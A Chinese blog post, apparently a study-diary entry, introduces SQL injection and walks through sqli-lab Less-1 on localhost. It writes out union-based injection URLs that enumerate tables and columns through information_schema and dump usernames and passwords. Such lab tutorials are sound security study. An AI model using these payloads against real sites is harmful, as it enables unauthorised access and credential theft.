# 1114.1011：简单的SQL注入

###### #每日三件事，第1011天#

OWASP top10 for 2021已经出炉了，相比2017年A01:injection下降到了2021年的A03Injection；2017年的A05
broken access control 一跃成为2021年的头名！

image

注入问题虽然有所下降，但依然是网络系统面临的严重威胁。

SQL注入是常见的一种注入形式，主要是将输入的信息再次构造成SQL语句并执行，从而得到应得数据之外的信息。

产生这种漏洞的根源就是系统没有对用户的输入进行严格的检查和限制。

学习SQL注入有很多平台，几乎可以说没有哪个提供安全学习的平台是没有SQL注入的。Dvma，bwapp，sqli-
lab，pikachu，webgoat，metasploitable2……其实是多的数不胜数，其中sqli-lab是专门用于SQL注入的平台。

学习SQL注入，最好先学习Linux，再学SQL，能多少学一点儿docker的知识就更好了。学习Linux主要是为了在Linux平台上安装MySQ数据库，学习docker是为了在Linux平台上启用sqli-
lab的实验环境。docker最大的好处就是一键部署，从docker hub下载sqli-
lab后，一条命令就可以启动这个学习平台了。根本不用再去为配置sqli-lab所学要的运行环境而操心。

说说学习SQL注入必须要掌握的几个SQL命令吧：

    
    
      select version()
      select database()
      select user()
      select @@basedir
      select @@datadir
    

union命令，就是联合查询。union命令后面select查询的列数量必须和主查询列的数量一致，否则就会出错。

MySQL
5.0以上出现了一张非常特殊的表information_schema库，这个库里面有schemata、tables、columns三张表。存储了数据库系统中所有的数据库名称、表名称以及列名称。关键是这张表对任何用户来说都有读取的权限，从这三张表中你可以找到你想要看的任何库、表和列。

在schemata表中找到库的名称，然后在columns表中table_schema存储的是库的名称，table_name存储的是表的名称，column_name存储的是列的名称。一个数据库的表和列都知道了，select语句直接查就是了。为什么不用“select
*” ？因为SQL注入的时候一般使用union查询，select * 不好使，必须得一个结果一个结果的查。

当然，为了闭合单引号，你一定得把sql语句后面的部分注释掉。用‘--
’，两个减号后面一定要加一个空格。用“#”也是可以的，不过有时候get注入的时候会出问题。对了，用’--+‘也一样能起到注释的作用。

#### sqli-lab的第一题：

url地址为：[http://localhost/less-1/](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2Fless-1%2F)，题目说了是get基于错误的单引号注入。

先探索一下select语句可以显示几列，分别在哪里显示：

    
    
    http://localhost/less-1/?id=1' union select 1,2,3 --+
    

测试的结果是3列，分别在第2和第3列显示查询的结果。

继续注入，找到数据库的版本和当前数据库的名称：

    
    
    http://localhost/less-1/?id=1' union select 1,version(),database() --+
    

就可以得到数据库的版本信息和当前的数据库名称security。

    
    
    http://localhost/Less-1/?id=1' union 
    select 1,2,table_name from information_schema.tables 
    where table_schema=database() limit 4,1 --+
    

这句的联合查询就是去找当前数据库中都有哪些表，不过显示的时候只有一行。因此要添加limit 0,1
命令，逐个去找，直到找到users表。如果用firefox或者chome安装hackbar插件的话，操作起来会更方便。当然用burpsuit也是可以的。

找到users表之后，就是找表中都有哪些列：

    
    
     http://localhost/Less-1/?id=1' union select 1,2,column_name 
    from information_schema.columns 
    where table_name='users'  limit 1,1 --+
    

可以使用这个命令，一次显示所有的列：

    
    
    http://localhost/Less-1/?id=1' union 
    select 1,2,group_concat(column_name) 
    from information_schema.columns 
    where table_name='users' limit 1,1 --+
    

知道了列名，接下来就是针对我们感兴趣的列获得其具体的数据：

    
    
     http://localhost/Less-1/?id=1' union 
    select 1,2,concat_ws(':',username,password) 
    from security.users limit 2,1 --+
    

当然，用sqlmap也是不错的。强大的工具，不过我觉得还是先学会手工注入，然后在用工具。最后别忘了学习一下python，在做各种注入的时候，如果能改自己写一段代码去做自动化注入的话，效率更高，效果更好。
